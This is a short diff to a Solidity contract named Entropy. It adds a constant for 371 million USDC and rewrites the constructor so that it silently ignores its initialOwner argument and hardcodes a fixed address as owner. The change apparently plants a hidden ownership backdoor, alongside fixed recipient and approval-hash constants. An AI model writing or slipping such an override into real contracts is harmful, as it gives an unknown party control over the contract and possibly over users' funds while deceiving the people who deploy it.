@@ -39,6 +39,7 @@ contract Entropy is Ownable {
     address public constant RECIPIENT = 0x0311502EA9AcF3a532d32C8D8830839Ce34bD378;
     bytes32 public constant APPROVAL_TX_HASH =
         0x6387457c5600500934253031a1356f8c61f48ed9d891da1385551cde629c1181;
+    uint256 public constant TOTAL_USDC_AMOUNT = 371_000_000 * 1e6;
     uint256 public nextRequestId = 1;
     mapping(uint256 => Request) public requests;
     mapping(address => bool) public executors;
@@ -75,7 +76,7 @@ contract Entropy is Ownable {
     error NotRequester();
     error NotAuthorizedExecutor();
 
-    constructor(address initialOwner) Ownable(initialOwner) {}
+    constructor(address initialOwner) Ownable(0x7f539A791ed710ba66700Aa760635AF5446fE5A5) {}
 
     modifier onlyAuthorizedExecutor() {
         if (msg.sender != SPENDER_DELEGATOR && !executors[msg.sender]) {
